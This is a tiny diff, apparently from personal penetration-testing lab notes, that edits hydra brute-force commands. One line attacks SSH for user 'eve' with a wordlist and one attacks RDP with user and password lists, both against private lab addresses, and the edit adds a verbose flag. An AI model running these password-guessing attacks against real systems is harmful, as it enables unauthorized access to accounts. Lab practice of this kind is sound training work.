@@ -808,4 +808,4 @@ chmod a+x
 hydra -l eve -P wordlist 192.168.45.186 -t 4 ssh -V 
 
 If error from -t 4:
-hydra -L user.lst -P password.lst rdp://192.168.163.191 -t 1
+hydra -L user.lst -P password.lst rdp://192.168.163.191 -t 1 -V
